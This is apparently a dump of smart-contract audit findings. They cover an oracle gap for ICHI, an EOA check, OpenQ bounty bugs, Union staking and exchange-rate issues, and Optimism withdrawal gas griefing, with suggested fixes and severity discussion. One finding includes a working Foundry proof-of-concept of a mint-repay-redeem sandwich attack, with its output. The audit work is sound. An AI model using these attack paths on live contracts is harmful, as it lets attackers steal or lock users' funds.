Alpha Homora. To simplify, this uses an oracle to get the prices of both underlying tokens, and then calculates the LP price based on these values and the reserves.\nHowever, this process requires that we have a functioning oracle for the underlying tokens. However, Chainlink and Band both do not support the ICHI token (see the links for their comprehensive lists of data feeds). As a result, the call to `base.getPrice(token0)` will fail.\nAll prices are calculated in the `isLiquidatable()` check at the end of the `execute()` function. As a result, any attempt to open a new ICHI position and post the LP tokens as collateral (which happens in both `openPosition()` and openPositionFarm()) will revert."чThere will need to be an alternate form of oracle that can price the ICHI token. The best way to accomplish this is likely to use a TWAP of the price on an AMM.\nDiscussion\nGornutz\nThere is additional oracles for assets not supported by chainlink or band but just not in scope of this specific audit.\nhrishibhat\nBased on the context there are no implementations for getting the price of the ICHI token. Considering this a valid issue.\nSergeKireev\nEscalate for 31 USDCчAll new positions opened using the `IchiVaultSpell` will revert when they attempt to look up the LP token price, rendering the protocol useless.\nCode Snippet\nTool used\nManual Review\nThis vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nsherlock-admin\nEscalate for 31 USDC\nImpact stated is medium, since positions cannot be opened and no funds are at risk. The high severity definition as stated per Sherlock docs:\nThis vulnerability would result in a material loss of funds and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nYou've created a valid escalation for 31 USDC!\nTo remove the escalation from consideration: Delete your comment. To change the amount you've staked on this escalation: Edit your comment (do not create a new comment).\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\nEscalation accepted\nThis is a valid medium Also Given that this is an issue only for the Ichi tokens and impact is only unable to open positions.\nsherlock-admin\nEscalation accepted\nThis is a valid medium Also Given that this is an issue only for the Ichi tokens and impact is only unable to open positions.\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.
onlyEOAEx modifier that ensures call is from EOA might not hold true in the futureчmediumч```\n    modifier onlyEOAEx() {\n        if (!allowContractCalls && !whitelistedContracts[msg.sender]) {\n            if (msg.sender != tx.origin) revert NOT_EOA(msg.sender);\n        }\n        _;\n    }\n```\nчmodifier `onlyEOAEx` is used to ensure calls are only made from EOA. However, EIP 3074 suggests that using `onlyEOAEx` modifier to ensure calls are only from EOA might not hold true.\nFor `onlyEOAEx`, `tx.origin` is used to ensure that the caller is from an EOA and not a smart contract.\n```\n    modifier onlyEOAEx() {\n        if (!allowContractCalls && !whitelistedContracts[msg.sender]) {\n            if (msg.sender != tx.origin) revert NOT_EOA(msg.sender);\n        }\n        _;\n    }\n```\n\nHowever, according to EIP 3074,\nThis EIP introduces two EVM instructions AUTH and AUTHCALL. The first sets a context variable authorized based on an ECDSA signature. The second sends a call as the authorized account. This essentially delegates control of the externally owned account (EOA) to a smart contract.\nTherefore, using tx.origin to ensure msg.sender is an EOA will not hold true in the event EIP 3074 goes through.чRecommend using OpenZepellin's `isContract` function (https://docs.openzeppelin.com/contracts/2.x/api/utils#Address-isContract-address-). Note that there are edge cases like contract in constructor that can bypass this and hence caution is required when using this.\n```\n    modifier onlyEOAEx() {\n        if (!allowContractCalls && !whitelistedContracts[msg.sender]) {\n            if (isContract(msg.sender)) revert NOT_EOA(msg.sender);\n        }\n        _;\n    }\n```\nчUsing modifier `onlyEOAEx` to ensure calls are made only from EOA will not hold true in the event EIP 3074 goes through.\nCode Snippet\nTool used\nManual Review
when issuer set new winner by calling setTierWinner() code should reset invoice and supporting documents for that tierчmediumч```\n    function setTierWinner(\n        string calldata _bountyId,\n        uint256 _tier,\n        string calldata _winner\n    ) external {\n        IBounty bounty = getBounty(_bountyId);\n        require(msg.sender == bounty.issuer(), Errors.CALLER_NOT_ISSUER);\n        bounty.setTierWinner(_winner, _tier);\n\n        emit TierWinnerSelected(\n            address(bounty),\n            bounty.getTierWinners(),\n            new bytes(0),\n            VERSION_1\n        );\n    }\n\n    function setTierWinner(string memory _winner, uint256 _tier)\n        external\n        onlyOpenQ\n    {\n        tierWinners[_tier] = _winner;\n    }\n```\nчif invoice or supporting documents are required to receive the winning prize then tier winner should provide them. bounty issuer or oracle would set invoice and supporting document status of a tier by calling `setInvoiceComplete()` and `setSupportingDocumentsComplete()`. bounty issuer can set tier winners by calling `setTierWinner()` but code won't reset the status of the invoice and supporting documents when tier winner changes. a malicious winner can bypass invoice and supporting document check by this issue.\nif bounty issuer set invoice and supporting documents as required for the bounty winners in the tiered bounty, then tier winner should provide those and bounty issuer or off-chain oracle would set the status of the invoice and documents for that tier. but if issuer wants to change a tier winner and calls `setTierWinner()` code would changes the tier winner but won't reset the status of the invoice and supporting documents for the new winner. This is the `setTierWinner()` code in OpenQV1 and TieredBountyCore:\n```\n    function setTierWinner(\n        string calldata _bountyId,\n        uint256 _tier,\n        string calldata _winner\n    ) external {\n        IBounty bounty = getBounty(_bountyId);\n        require(msg.sender == bounty.issuer(), Errors.CALLER_NOT_ISSUER);\n        bounty.setTierWinner(_winner, _tier);\n\n        emit TierWinnerSelected(\n            address(bounty),\n            bounty.getTierWinners(),\n            new bytes(0),\n            VERSION_1\n        );\n    }\n\n    function setTierWinner(string memory _winner, uint256 _tier)\n        external\n        onlyOpenQ\n    {\n        tierWinners[_tier] = _winner;\n    }\n```\n\nAs you can see code only sets the `tierWinner[tier]` and won't reset `invoiceComplete[tier]` or `supportingDocumentsComplete[tier]` to false. This would cause an issue when issuer wants to change the tier winner. these are the steps that makes the issue:\nUserA creates tiered Bounty1 and set invoice and supporting documents as required for winners to claim their funds.\nUserA would set User1 as winner of tier 1 and User1 completed the invoice and oracle would set `invoiceComplete[1]` = true.\nUserA would change tier winner to User2 because User1 didn't complete supporting documents phase. now User2 is winner of tier 1 and `invoiceComplete[1]` is true and User2 only required to complete supporting documents and User2 would receive the win prize without completing the invoice phase.ч"
Resizing the payout schedule with less items might revertчmediumч```\nfunction setPayoutScheduleFixed(\n        uint256[] calldata _payoutSchedule,\n        address _payoutTokenAddress\n    ) external onlyOpenQ {\n        require(\n            bountyType == OpenQDefinitions.TIERED_FIXED,\n            Errors.NOT_A_FIXED_TIERED_BOUNTY\n        );\n        payoutSchedule = _payoutSchedule;\n        payoutTokenAddress = _payoutTokenAddress;\n\n        // Resize metadata arrays and copy current members to new array\n        // NOTE: If resizing to fewer tiers than previously, the final indexes will be removed\n        string[] memory newTierWinners = new string[](payoutSchedule.length);\n        bool[] memory newInvoiceComplete = new bool[](payoutSchedule.length);\n        bool[] memory newSupportingDocumentsCompleted = new bool[](\n            payoutSchedule.length\n        );\n\n        for (uint256 i = 0; i < tierWinners.length; i++) { <=====================================================\n            newTierWinners[i] = tierWinners[i];\n        }\n        tierWinners = newTierWinners;\n\n        for (uint256 i = 0; i < invoiceComplete.length; i++) { <=====================================================\n            newInvoiceComplete[i] = invoiceComplete[i];\n        }\n        invoiceComplete = newInvoiceComplete;\n\n        for (uint256 i = 0; i < supportingDocumentsComplete.length; i++) { <=====================================================\n            newSupportingDocumentsCompleted[i] = supportingDocumentsComplete[i];\n        }\n        supportingDocumentsComplete = newSupportingDocumentsCompleted;\n    }\n```\nчAccording to some comments in `setPayoutScheduleFixed`, reducing the number of items in the schedule is a supported use case. However in that case, the function will revert because we are iterating over as many items as there was in the previous version of the three arrays making the function revert since the new arrays have less items.\nLet say they were 4 items in the arrays `tierWinners`, `invoiceComplete` and `supportingDocumentsComplete` and we are resizing the schedule to 3 items. Then the following function would revert because we use the length of the previous arrays instead of the new ones in the for loops.\n```\nfunction setPayoutScheduleFixed(\n        uint256[] calldata _payoutSchedule,\n        address _payoutTokenAddress\n    ) external onlyOpenQ {\n        require(\n            bountyType == OpenQDefinitions.TIERED_FIXED,\n            Errors.NOT_A_FIXED_TIERED_BOUNTY\n        );\n        payoutSchedule = _payoutSchedule;\n        payoutTokenAddress = _payoutTokenAddress;\n\n        // Resize metadata arrays and copy current members to new array\n        // NOTE: If resizing to fewer tiers than previously, the final indexes will be removed\n        string[] memory newTierWinners = new string[](payoutSchedule.length);\n        bool[] memory newInvoiceComplete = new bool[](payoutSchedule.length);\n        bool[] memory newSupportingDocumentsCompleted = new bool[](\n            payoutSchedule.length\n        );\n\n        for (uint256 i = 0; i < tierWinners.length; i++) { <=====================================================\n            newTierWinners[i] = tierWinners[i];\n        }\n        tierWinners = newTierWinners;\n\n        for (uint256 i = 0; i < invoiceComplete.length; i++) { <=====================================================\n            newInvoiceComplete[i] = invoiceComplete[i];\n        }\n        invoiceComplete = newInvoiceComplete;\n\n        for (uint256 i = 0; i < supportingDocumentsComplete.length; i++) { <=====================================================\n            newSupportingDocumentsCompleted[i] = supportingDocumentsComplete[i];\n        }\n        supportingDocumentsComplete = newSupportingDocumentsCompleted;\n    }\n```\n\nThe same issue exists on TieredPercentageBounty too.ч```\n        for (uint256 i = 0; i < newTierWinners.length; i++) {\n            newTierWinners[i] = tierWinners[i];\n        }\n        tierWinners = newTierWinners;\n\n        for (uint256 i = 0; i < newInvoiceComplete.length; i++) {\n            newInvoiceComplete[i] = invoiceComplete[i];\n        }\n        invoiceComplete = newInvoiceComplete;\n\n        for (uint256 i = 0; i < newSupportingDocumentsCompleted.length; i++) {\n            newSupportingDocumentsCompleted[i] = supportingDocumentsComplete[i];\n        }\n        supportingDocumentsComplete = newSupportingDocumentsCompleted;\n```\n\nNote this won't work if increasing the number of items compared to previous state must also be supported. In that case you must use the length of the smallest of the two arrays in each for loop.\nDiscussion\nFlacoJones\nA valid issue but an invalid approach. Because if one is INCREASING the size of the array, you will still get an array out of bounds exception.\nThis suggestion, combined with adding a `i >= previousArray.length` will do the trick\nhttps://github.com/OpenQDev/OpenQ-Contracts/pull/126чUnable to resize the payout schedule to less items than the previous state.\nCode Snippet\nTool used\nManual Review
The `exchangeRateStored()` function allows front-running on repaymentsчmediumч"```\n    function increaseTotalSupply(uint256 _amount) private {\n        daiMock.mint(address(this), _amount);\n        daiMock.approve(address(uToken), _amount);\n        uToken.mint(_amount);\n    }\n\n    function testMintRedeemSandwich() public {\n        increaseTotalSupply(50 ether);\n\n        vm.prank(ALICE);\n        uToken.borrow(ALICE, 50 ether);\n        uint256 borrowed = uToken.borrowBalanceView(ALICE);\n\n        vm.roll(block.number + 500);\n\n        vm.startPrank(BOB);\n        daiMock.approve(address(uToken), 100 ether);\n        uToken.mint(100 ether);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] BOB balance:"", uToken.balanceOf(BOB));\n        console.log(""[DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n        uint256 currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[1] Exchange rate:"", currExchangeRate);\n        vm.stopPrank();\n\n        vm.startPrank(ALICE);\n        uint256 interest = uToken.calculatingInterest(ALICE);\n        uint256 repayAmount = borrowed + interest;\n\n        daiMock.approve(address(uToken), repayAmount);\n        uToken.repayBorrow(ALICE, repayAmount);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] ALICE balance:"", uToken.balanceOf(ALICE));\n        console.log(""[DAI]    ALICE balance:"", daiMock.balanceOf(ALICE));\n\n        currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[2] Exchange rate:"", currExchangeRate);\n        vm.stopPrank();\n\n        vm.startPrank(BOB);\n        uToken.redeem(uToken.balanceOf(BOB), 0);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] BOB balance:"", uToken.balanceOf(BOB));\n        console.log(""[DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n        currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[3] Exchange rate:"", currExchangeRate);\n    }\n```\n"ч"The `exchangeRateStored()` function allows to perform front-running attacks when a repayment is being executed.\nSince `_repayBorrowFresh()` increases `totalRedeemable` value which affects in the final exchange rate calculation used in functions such as `mint()` and `redeem()`, an attacker could perform a front-run to any repayment by minting `UTokens` beforehand, and redeem these tokens after the front-run repayment. In this situation, the attacker would always be obtaining profits since `totalRedeemable` value is increased after every repayment.\nProof of Concept\n```\n    function increaseTotalSupply(uint256 _amount) private {\n        daiMock.mint(address(this), _amount);\n        daiMock.approve(address(uToken), _amount);\n        uToken.mint(_amount);\n    }\n\n    function testMintRedeemSandwich() public {\n        increaseTotalSupply(50 ether);\n\n        vm.prank(ALICE);\n        uToken.borrow(ALICE, 50 ether);\n        uint256 borrowed = uToken.borrowBalanceView(ALICE);\n\n        vm.roll(block.number + 500);\n\n        vm.startPrank(BOB);\n        daiMock.approve(address(uToken), 100 ether);\n        uToken.mint(100 ether);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] BOB balance:"", uToken.balanceOf(BOB));\n        console.log(""[DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n        uint256 currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[1] Exchange rate:"", currExchangeRate);\n        vm.stopPrank();\n\n        vm.startPrank(ALICE);\n        uint256 interest = uToken.calculatingInterest(ALICE);\n        uint256 repayAmount = borrowed + interest;\n\n        daiMock.approve(address(uToken), repayAmount);\n        uToken.repayBorrow(ALICE, repayAmount);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] ALICE balance:"", uToken.balanceOf(ALICE));\n        console.log(""[DAI]    ALICE balance:"", daiMock.balanceOf(ALICE));\n\n        currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[2] Exchange rate:"", currExchangeRate);\n        vm.stopPrank();\n\n        vm.startPrank(BOB);\n        uToken.redeem(uToken.balanceOf(BOB), 0);\n\n        console.log(""\n  [UToken] Total supply:"", uToken.totalSupply());\n        console.log(""[UToken] BOB balance:"", uToken.balanceOf(BOB));\n        console.log(""[DAI]    BOB balance:"", daiMock.balanceOf(BOB));\n\n        currExchangeRate = uToken.exchangeRateStored();\n        console.log(""[3] Exchange rate:"", currExchangeRate);\n    }\n```\n\nResult\n```\n[PASS] testMintRedeemSandwich() (gas: 560119)\nLogs:\n\n  [UToken] Total supply: 150000000000000000000\n  [UToken] BOB balance: 100000000000000000000\n  [DAI]    BOB balance: 0\n  [1] Exchange rate: 1000000000000000000\n\n  [UToken] Total supply: 150000000000000000000\n  [UToken] ALICE balance: 0\n  [DAI]    ALICE balance: 99474750000000000000\n  [2] Exchange rate: 1000084166666666666\n\n  [UToken] Total supply: 50000000000000000000\n  [UToken] BOB balance: 0\n  [DAI]    BOB balance: 100008416666666666600\n  [3] Exchange rate: 1000084166666666668\n```\n"ч
Users can lose their staking rewards.чmediumч```\n(UserManagerAccountState memory user, Info memory userInfo, uint256 pastBlocks) = _getUserInfo(\n            userManager,\n            account,\n            token,\n            0\n        );\n```\nч"By following the steps described in `Vulnerability Detail`, user is able to lose all of his staking rewards.\nThe issue occurs in the following steps described below:\nKiki calls the function `unstake` and unstakes all of his funds, as a result the internal function `_updateStakedCoinAge` is called to update his staked coin age till the current block.\nAfter that Kiki calls the function `withdrawRewards` in order to withdraw his staking rewards. Everything executes fine, but the contract lacks union tokens and can't transfer the tokens to Kiki, so the else statement is triggered and the amount of tokens is added to his accrued balance, so he can still be able to withdraw them after.\nThis is where the issue occurs, next time Kiki calls the function `withdrawRewards`, he is going to lose all of his rewards.\nExplanation of how this happens:\nFirst the internal function _getUserInfo will return the struct `UserManagerAccountState memory user`, which contains zero amount for effectiveStaked, because Kiki unstaked all of his funds and already called the function withdrawRewards once. This happens because Kiki has `stakedAmount = 0, stakedCoinAge = 0, lockedCoinAge = 0, frozenCoinAge = 0`.\n```\n(UserManagerAccountState memory user, Info memory userInfo, uint256 pastBlocks) = _getUserInfo(\n            userManager,\n            account,\n            token,\n            0\n        );\n```\n\nThe cache `uint256 amount` will have a zero value because of the if statement applied in the internal function `_calculateRewardsByBlocks`, the if statement will be triggered as Kiki's effectiveStaked == 0, and as a result the function will return zero.\n```\nuint256 amount = _calculateRewardsByBlocks(account, token, pastBlocks, userInfo, globalTotalStaked, user);\n```\n\n```\nif (user.effectiveStaked == 0 || totalStaked == 0 || startInflationIndex == 0 || pastBlocks == 0) {\n            return 0;\n        }\n```\n\nSince the cache `uint256 amount` have a zero value, the if statement in the function `withdrawRewards` will actually be ignored because of `&& amount > 0`. And the else statement will be triggered, which will override Kiki's accrued balance with ""amount"", which is actually zero. As a result Kiki will lose his rewards.\n```\nif (unionToken.balanceOf(address(this)) >= amount && amount > 0) {\n            unionToken.safeTransfer(account, amount);\n            users[account][token].accrued = 0;\n            emit LogWithdrawRewards(account, amount);\n\n            return amount;\n        } else {\n            users[account][token].accrued = amount;\n            emit LogWithdrawRewards(account, 0);\n\n            return 0;\n        }\n```\n"чOne way of fixing this problem, that l can think of is to refactor the function _calculateRewardsByBlocks. First the function _calculateRewardsByBlocks will revert if `(totalStaked == 0 || startInflationIndex == 0 || pastBlocks == 0)`. Second new if statement is created, which is triggered if `user.effectiveStaked == 0`.\nif `userInfo.accrued == 0`, it will return 0.\nif `userInfo.accrued != 0`, it will return the accrued balance.\n```\nfunction _calculateRewardsByBlocks(\n        address account,\n        address token,\n        uint256 pastBlocks,\n        Info memory userInfo,\n        uint256 totalStaked,\n        UserManagerAccountState memory user\n    ) internal view returns (uint256) {\n        uint256 startInflationIndex = users[account][token].inflationIndex;\n\n        if (totalStaked == 0 || startInflationIndex == 0 || pastBlocks == 0) {\n            revert ZeroNotAllowed();\n        }\n        \n        if (user.effectiveStaked == 0) {\n           if (userInfo.accrued == 0) return 0;\n           else return userInfo.accrued\n        }\n\n        uint256 rewardMultiplier = _getRewardsMultiplier(user);\n\n        uint256 curInflationIndex = _getInflationIndexNew(totalStaked, pastBlocks);\n\n        if (curInflationIndex < startInflationIndex) revert InflationIndexTooSmall();\n\n        return\n            userInfo.accrued +\n            (curInflationIndex - startInflationIndex).wadMul(user.effectiveStaked).wadMul(rewardMultiplier);\n    }\n```\n\nDiscussion\nkingjacob\nThis is valid but medium severity as its inaccurate rewards not a loss of funds.\nhrishibhat\nConsidering this issue a valid medium as there is a precondition of an underfunded contract for this to occur which is highly unlikely.ч"The impact here is that users can lose their staking rewards.\nTo understand the scenario which is described in `Vulnerability Detail`, you'll need to know how the codebase works. Here in the impact section, l will describe in little more details and trace the functions.\nThe issue occurs in 3 steps like described in Vulnerability Detail:\nUser unstakes all of his funds.\nThen he calls the function `withdrawRewards` in order to withdraw his rewards, everything executes fine but the contract lacks union tokens, so instead of transferring the tokens to the user, they are added to his accrued balance so he can still withdraw them after.\nThe next time the user calls the function `withdrawRewards` in order to withdraw his accrued balance of tokens, he will lose all of his rewards.\nExplanation in details:\nUser unstakes all of his funds by calling the function `unstake`.\nHis stakedAmount will be reduced to zero in the struct `Staker`.\nHis stakedCoinAge will be updated to the current block with the internal function `_updateStakedCoinAge`.\nThen he calls the function withdrawRewards in order to withdraw his rewards, everything executes fine but the contract lacks union tokens, so instead of transferring the tokens to the user, they are added to his accrued balance so he can still withdraw them after.\nUser's stakedCoinAge, lockedCoinAge and frozenCoinAge are reduced to zero in the function `onWithdrawRewards`.\nThe next time the user calls the function `withdrawRewards` in order to withdraw his accrued balance of tokens, he will lose all of his rewards.\nIn order to withdraw his accrued rewards stored in his struct balance `Info`. He calls the function `withdrawRewards` again and this is where the issue occurs, as the user has `stakedAmount = 0, stakedCoinAge = 0, lockedCoinAge = 0, frozenCoinAge = 0` .\nDuo to that the outcome of the function _getCoinAge, which returns a memory struct of CoinAge to the function `_getEffectiveAmounts` will look like this:\n```\nCoinAge memory coinAge = CoinAge({\n            lastWithdrawRewards: lastWithdrawRewards,\n            diff: diff,\n            stakedCoinAge: staker.stakedCoinAge + diff * uint256(staker.stakedAmount),\n            lockedCoinAge: staker.lockedCoinAge,\n            frozenCoinAge: frozenCoinAge[stakerAddress]\n        });\n\n// The function will return:\nCoinAge memory coinAge = CoinAge({\n            lastWithdrawRewards: random number,\n            diff: random number,\n            stakedCoinAge: 0 + random number * 0,\n            lockedCoinAge: 0, \n            frozenCoinAge: 0\n        });\n```\n\nAs a result the function `_getEffectiveAmounts` will return zero values for effectiveStaked and effectiveLocked to the function `onWithdrawRewards`.\n```\nreturn (\n            // staker's total effective staked = (staked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (coinAge.stakedCoinAge - coinAge.frozenCoinAge) / coinAge.diff,\n            // effective locked amount = (locked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (coinAge.lockedCoinAge - coinAge.frozenCoinAge) / coinAge.diff,\n            memberTotalFrozen\n        );\n\nreturn (\n            // staker's total effective staked = (staked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (0 - 0) / random number,\n             // effective locked amount = (locked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (0 - 0) / random number,\n            0\n        );\n```\n\nAfter that the function `withdrawRewards` caches the returning value from the internal function `_calculateRewardsByBlocks`. What happens is that in the function `_calculateRewardsByBlocks` the if statement is triggered because the user's effectiveStaked == 0. As a result the internal function will return 0 and the cache `uint256 amount` will equal zero.\n```\nuint256 amount = _calculateRewardsByBlocks(account, token, pastBlocks, userInfo, globalTotalStaked, user);\n```\n\n```\nif (user.effectiveStaked == 0 || totalStaked == 0 || startInflationIndex == 0 || pastBlocks == 0) {\n            return 0;\n        }\n```\n\nSince the cache `uint256 amount` have a zero value, the if statement in the function `withdrawRewards` will actually be ignored because of `&& amount > 0`. And the else statement will be triggered, which will override Kiki's accrued balance with ""amount"", which is actually zero.\n```\nif (unionToken.balanceOf(address(this)) >= amount && amount > 0) {\n            unionToken.safeTransfer(account, amount);\n            users[account][token].accrued = 0;\n            emit LogWithdrawRewards(account, amount);\n\n            return amount;\n        } else {\n            users[account][token].accrued = amount;\n            emit LogWithdrawRewards(account, 0);\n\n            return 0;\n        }\n```\n\nBelow you can see the functions which are invoked starting from the function _getUserInfo:\n```\n(UserManagerAccountState memory user, Info memory userInfo, uint256 pastBlocks) = _getUserInfo(\n            userManager,\n            account,\n            token,\n            0\n        );\n```\n\n```\nfunction _getUserInfo(\n        IUserManager userManager,\n        address account,\n        address token,\n        uint256 futureBlocks\n    ) internal returns (UserManagerAccountState memory user, Info memory userInfo, uint256 pastBlocks) {\n        userInfo = users[account][token];\n        uint256 lastUpdatedBlock = userInfo.updatedBlock;\n        if (block.number < lastUpdatedBlock) {\n            lastUpdatedBlock = block.number;\n        }\n\n        pastBlocks = block.number - lastUpdatedBlock + futureBlocks;\n\n        (user.effectiveStaked, user.effectiveLocked, user.isMember) = userManager.onWithdrawRewards(\n            account,\n            pastBlocks\n        );\n    }\n```\n\n```\nfunction onWithdrawRewards(address staker, uint256 pastBlocks)\n        external\n        returns (\n            uint256 effectiveStaked,\n            uint256 effectiveLocked,\n            bool isMember\n        )\n    {\n        if (address(comptroller) != msg.sender) revert AuthFailed();\n        uint256 memberTotalFrozen = 0;\n        (effectiveStaked, effectiveLocked, memberTotalFrozen) = _getEffectiveAmounts(staker, pastBlocks);\n        stakers[staker].stakedCoinAge = 0;\n        stakers[staker].lastUpdated = uint64(block.number);\n        stakers[staker].lockedCoinAge = 0;\n        frozenCoinAge[staker] = 0;\n        getLastWithdrawRewards[staker] = block.number;\n\n        uint256 memberFrozenBefore = memberFrozen[staker];\n        if (memberFrozenBefore != memberTotalFrozen) {\n            memberFrozen[staker] = memberTotalFrozen;\n            totalFrozen = totalFrozen - memberFrozenBefore + memberTotalFrozen;\n        }\n\n        isMember = stakers[staker].isMember;\n    }\n```\n\n```\nfunction _getEffectiveAmounts(address stakerAddress, uint256 pastBlocks)\n        private\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n        )\n    {\n        uint256 memberTotalFrozen = 0;\n        CoinAge memory coinAge = _getCoinAge(stakerAddress);\n\n        uint256 overdueBlocks = uToken.overdueBlocks();\n        uint256 voucheesLength = vouchees[stakerAddress].length;\n        // Loop through all of the stakers vouchees sum their total\n        // locked balance and sum their total currDefaultFrozenCoinAge\n        for (uint256 i = 0; i < voucheesLength; i++) {\n            // Get the vouchee record and look up the borrowers voucher record\n            // to get the locked amount and lastUpdated block number\n            Vouchee memory vouchee = vouchees[stakerAddress][i];\n            Vouch memory vouch = vouchers[vouchee.borrower][vouchee.voucherIndex];\n\n            uint256 lastRepay = uToken.getLastRepay(vouchee.borrower);\n            uint256 repayDiff = block.number - _max(lastRepay, coinAge.lastWithdrawRewards);\n            uint256 locked = uint256(vouch.locked);\n\n            if (overdueBlocks < repayDiff && (coinAge.lastWithdrawRewards != 0 || lastRepay != 0)) {\n                memberTotalFrozen += locked;\n                if (pastBlocks >= repayDiff) {\n                    coinAge.frozenCoinAge += (locked * repayDiff);\n                } else {\n                    coinAge.frozenCoinAge += (locked * pastBlocks);\n                }\n            }\n\n            uint256 lastUpdateBlock = _max(coinAge.lastWithdrawRewards, uint256(vouch.lastUpdated));\n            coinAge.lockedCoinAge += (block.number - lastUpdateBlock) * locked;\n        }\n\n        return (\n            // staker's total effective staked = (staked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (coinAge.stakedCoinAge - coinAge.frozenCoinAge) / coinAge.diff,\n            // effective locked amount = (locked coinage - frozen coinage) / (# of blocks since last reward claiming)\n            coinAge.diff == 0 ? 0 : (coinAge.lockedCoinAge - coinAge.frozenCoinAge) / coinAge.diff,\n            memberTotalFrozen\n        );\n    }\n```\n\n```\nfunction _getCoinAge(address stakerAddress) private view returns (CoinAge memory) {\n        Staker memory staker = stakers[stakerAddress];\n\n        uint256 lastWithdrawRewards = getLastWithdrawRewards[stakerAddress];\n        uint256 diff = block.number - _max(lastWithdrawRewards, uint256(staker.lastUpdated));\n\n        CoinAge memory coinAge = CoinAge({\n            lastWithdrawRewards: lastWithdrawRewards,\n            diff: diff,\n            stakedCoinAge: staker.stakedCoinAge + diff * uint256(staker.stakedAmount),\n            lockedCoinAge: staker.lockedCoinAge,\n            frozenCoinAge: frozenCoinAge[stakerAddress]\n        });\n\n        return coinAge;\n    }\n```\n\nBelow you can see the function _calculateRewardsByBlocks:\n```\nfunction _calculateRewardsByBlocks(\n        address account,\n        address token,\n        uint256 pastBlocks,\n        Info memory userInfo,\n        uint256 totalStaked,\n        UserManagerAccountState memory user\n    ) internal view returns (uint256) {\n        uint256 startInflationIndex = users[account][token].inflationIndex;\n\n        if (user.effectiveStaked == 0 || totalStaked == 0 || startInflationIndex == 0 || pastBlocks == 0) {\n            return 0;\n        }\n\n        uint256 rewardMultiplier = _getRewardsMultiplier(user);\n\n        uint256 curInflationIndex = _getInflationIndexNew(totalStaked, pastBlocks);\n\n        if (curInflationIndex < startInflationIndex) revert InflationIndexTooSmall();\n\n        return\n            userInfo.accrued +\n            (curInflationIndex - startInflationIndex).wadMul(user.effectiveStaked).wadMul(rewardMultiplier);\n    }\n```\n\nCode Snippet\nTool used\nManual Review"
Malicious user can finalize other’s withdrawal with less than specified gas limit, leading to loss of fundsчhighч"```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);\n```\n"ч"Transactions to execute a withdrawal from the Optimism Portal can be sent with 5122 less gas than specified by the user, because the check is performed a few operations prior to the call. Because there are no replays on this contract, the result is that a separate malicious user can call `finalizeWithdrawalTransaction()` with a precise amount of gas, cause the withdrawer’s withdrawal to fail, and permanently lock their funds.\nWithdrawals can be initiated directly from the `L2ToL1MessagePasser` contract on L2. These withdrawals can be withdrawn directly from the `OptimismPortal` on L1. This path is intended to be used only by users who know what they are doing, presumably to save the gas of going through the additional more “user-friendly” contracts.\nOne of the quirks of the `OptimismPortal` is that there is no replaying of transactions. If a transaction fails, it will simply fail, and all ETH associated with it will remain in the `OptimismPortal` contract. Users have been warned of this and understand the risks, so Optimism takes no responsibility for user error.\nHowever, there is an issue in the implementation of `OptimismPortal` that a withdrawal transaction can be executed with 5122 gas less than the user specified. In many cases, this could cause their transaction to revert, without any user error involved. Optimism is aware of the importance of this property being correct when they write in the comments:\nWe want to maintain the property that the amount of gas supplied to the call to the target contract is at least the gas limit specified by the user. We can do this by enforcing that, at this point in time, we still have gaslimit + buffer gas available.\nThis property is not maintained because of the gap between the check and the execution.\nThe check is as follows, where FINALIZE_GAS_BUFFER == 20_000:\n```\nrequire(\n    gasleft() >= _tx.gasLimit + FINALIZE_GAS_BUFFER,\n    ""OptimismPortal: insufficient gas to finalize withdrawal""\n);\n```\n\nAfter this check, we know that the current execution context has at least 20,000 more gas than the gas limit. However, we then proceed to spend gas by (a) assigning the `l2Sender` storage variable, which uses 2900 gas because it’s assigning from a non-zero value, and (b) perform some additional operations to prepare the contract for the external call.\nThe result is that, by the time the call is sent with `gasleft() - FINALIZE_GAS_BUFFER` gas, `gasleft()` is 5122 lower than it was in the initial check.\nMathematically, this can be expressed as:\n`gasAtCheck >= gasLimit + 20000`\n`gasSent == gasAtCall - 20000`\n`gasAtCall == gasAtCheck - 5122`\nRearranging, we get `gasSent >= gasLimit + 20000 - 5122 - 20000`, which simplifies to `gasSent >= gasLimit - 5122`."чInstead of using one value for `FINALIZE_GAS_BUFFER`, two separate values should be used that account for the gas used between the check and the call.\nDiscussion\nrcstanciu\nComment from Optimism\n\nDescription: Malicious user can finalize other’s withdrawal with less than specified gas limit, leading to loss of funds\nReason: This issue allows for attackers to permissionlessly brick a withdrawal transaction that specifies a minimum gas limit < `required_gas + 5122`. Most users will simply simulate the L1 transaction to identify the minimum gas needed for their withdrawal tx without including any padding, 